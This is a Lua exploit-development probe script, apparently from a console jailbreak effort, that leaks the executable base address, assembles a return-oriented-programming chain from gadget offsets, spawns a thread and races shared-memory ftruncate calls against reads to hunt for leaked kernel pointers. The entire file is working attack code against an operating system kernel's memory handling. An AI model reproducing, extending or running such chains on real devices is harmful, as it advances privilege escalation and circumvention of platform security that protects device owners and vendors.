-- CRASH_CLASS: HIGH
-- PROBE 1108a: SHM ftruncate race — LIVE
--
-- 1107a confirmed: 384b pattern works for ftruncate from child thread.
-- Now: child loops ftruncate(SMALL)/ftruncate(LARGE) 50 times,
-- parent races reads on boundary pages looking for stale kernel metadata.
-- Using pop_rsp;ret at eboot+0x9A2 for self-looping (found by 1106a).

print("=== PROBE 1108a: SHM FTRUNCATE RACE ===")
print("")

local function N(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function mk(n)
    local t = {}; for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = n; setmetatable(t, getmetatable(syscall.pipe)); return t
end
local function rd(a)
    local ok, v = pcall(function() return memory.read_dword(a) end)
    if ok then return N(v) end return nil
end
local function rq(a)
    local ok, v = pcall(function() return memory.read_qword(a) end)
    if ok then return v end return nil
end
local function wd(a, v) pcall(function() memory.write_dword(a, v) end) end
local function wq(a, v) pcall(function() memory.write_qword(a, v) end) end
local function get_hi_lo(val)
    if type(val) == "table" and val.h then return val.h, val.l end
    return 0, N(val)
end
local function fmt(val)
    if val == nil then return "nil" end
    local h, l = get_hi_lo(val)
    if h < 0 then h = h + 0x100000000 end
    if l < 0 then l = l + 0x100000000 end
    return string.format("0x%08X%08X", h, l)
end

local stub = syscall.pipe.fn_addr
local pid_val = N(native.fcall_with_rax(stub, 20))
print("pid=" .. pid_val)
local function alive() return N(native.fcall_with_rax(stub, 20)) == pid_val end

local ib = memory.alloc(0x200)
wd(N(ib), 0x160)
pcall(function() mk(593)(uint64(0), ib) end)
local elo = rd(N(ib) + 0x108) or 0
local ehi = rd(N(ib) + 0x10C) or 0
if elo < 0 then elo = elo + 0x100000000 end
if ehi < 0 then ehi = ehi + 0x100000000 end
local eb = uint64(string.format("0x%X%08X", ehi, elo))
print("eboot=" .. fmt(eb))

local g_pop_rax = eb + 0x992
local g_pop_rdi = eb + 0xC9DFE
local g_pop_rsi = eb + 0xD77D
local g_bare_ret = eb + 0x42
local g_mov_m_rax = eb + 0x92C67

local sc477 = mk(477)
local sc480 = mk(480)
local sc482 = mk(482)

local LARGE = 0x40000
local SMALL = 0x4000
local ITERS = 50

-- [A] SHM setup
print("[A] SHM")
local shm_fd = N(sc482(uint64(1), uint64(0x602), uint64(0x1FF)))
print("shm_fd=" .. shm_fd)

N(sc480(uint64(shm_fd), uint64(LARGE)))
local map = sc477(uint64(0), uint64(LARGE), uint64(3), uint64(1), uint64(shm_fd), uint64(0))
local map_n = N(map)
print("map=" .. fmt(map))

for p = 0, 15 do
    wd(map_n + p * 0x4000, 0xAA000000 + p)
    wd(map_n + p * 0x4000 + 4, 0xBB000000 + p)
end

-- TCB
local tcb = memory.alloc(0x1000)
local tcb_a = N(tcb)
for i = 0, 0xFFC, 4 do wd(tcb_a + i, 0) end
for i = 0, 0xFF8, 8 do wq(tcb_a + i, uint64(tcb_a)) end
local fs_ptr = memory.alloc(8)
wq(N(fs_ptr), uint64(tcb_a))

-- Done flag
local done_flag = memory.alloc(8)
wq(N(done_flag), uint64(0))

-- [B] Build chain: sysarch + N×(ftruncate SMALL, ftruncate LARGE) + done + exit
print(string.format("[B] chain (%d iters)", ITERS))

local stk = memory.alloc(0x10000)
local sb = N(stk)
local ss = 0x8000
local rsp = sb + ss - ((sb + ss) % 16) - 8

local off = 0
local function emit(v) wq(rsp + off, v); off = off + 8 end

-- sysarch(129, &tcb)
emit(g_pop_rdi);       emit(uint64(129))
emit(g_pop_rsi);       emit(uint64(N(fs_ptr)))
emit(g_pop_rax);       emit(uint64(165))
emit(stub)

-- ftruncate loop
for i = 1, ITERS do
    emit(g_pop_rdi);   emit(uint64(shm_fd))
    emit(g_pop_rsi);   emit(uint64(SMALL))
    emit(g_pop_rax);   emit(uint64(480))
    emit(stub)

    emit(g_pop_rdi);   emit(uint64(shm_fd))
    emit(g_pop_rsi);   emit(uint64(LARGE))
    emit(g_pop_rax);   emit(uint64(480))
    emit(stub)
end

-- done marker
emit(g_pop_rax);       emit(uint64(0xDEAD1108))
emit(g_pop_rdi);       emit(uint64(N(done_flag)))
emit(g_mov_m_rax)

-- exit
emit(g_pop_rdi);       emit(uint64(0))
emit(g_pop_rax);       emit(uint64(431))
emit(stub)

print(string.format("  %d qwords (%d bytes)", off / 8, off))

-- thr_param
local par = memory.alloc(0x40)
local pa = N(par)
for i = 0, 0x3C, 4 do wd(pa + i, 0) end
wq(pa, g_bare_ret)
wq(pa + 8, uint64(0))
wq(pa + 0x10, uint64(sb))
wq(pa + 0x18, uint64(ss))
local tid = memory.alloc(8); wq(N(tid), uint64(0))
wq(pa + 0x30, tid)

-- [C] Spawn and race
print("[C] spawning + racing")
local ok1, rv1 = pcall(function() return mk(455)(par, uint64(0x38)) end)
local thr_ret = ok1 and N(rv1) or -999
print("thr_new=" .. thr_ret)
if thr_ret ~= 0 then print("FAIL"); return end

local kptr_count = 0
local zero_count = 0
local anom_count = 0
local fault_count = 0
local reads = 0
local done_round = 0

for round = 1, 5000 do
    for pg = 1, 7 do
        local ok2, val = pcall(function()
            return memory.read_qword(uint64(map_n + pg * 0x4000))
        end)
        reads = reads + 1
        if not ok2 or val == nil then
            fault_count = fault_count + 1
        else
            local h, l = get_hi_lo(val)
            if h < 0 then h = h + 0x100000000 end
            if l < 0 then l = l + 0x100000000 end

            if h >= 0xFFFF8000 and h ~= 0xFFFFFFFF then
                kptr_count = kptr_count + 1
                if kptr_count <= 30 then
                    print(string.format("  [KPTR!] r%d p%d: 0x%08X%08X", round, pg, h, l))
                end
            elseif h == 0 and l == 0 then
                zero_count = zero_count + 1
            else
                if l ~= (0xAA000000 + pg) or h ~= (0xBB000000 + pg) then
                    anom_count = anom_count + 1
                    if anom_count <= 30 then
                        print(string.format("  [ANOM] r%d p%d: 0x%08X%08X", round, pg, h, l))
                    end
                end
            end
        end
    end

    local df = rd(N(done_flag))
    if df and df ~= 0 then
        done_round = round
        break
    end

    -- Re-write sentinels on backed pages
    for pg = 1, 7 do
        pcall(function()
            wd(map_n + pg * 0x4000, 0xAA000000 + pg)
            wd(map_n + pg * 0x4000 + 4, 0xBB000000 + pg)
        end)
    end
end

print("")
print(string.format("done_round=%d reads=%d", done_round, reads))
print(string.format("kptrs=%d anom=%d zeros=%d faults=%d", kptr_count, anom_count, zero_count, fault_count))
print("alive=" .. tostring(alive()))
print("=== PROBE 1108a COMPLETE ===")
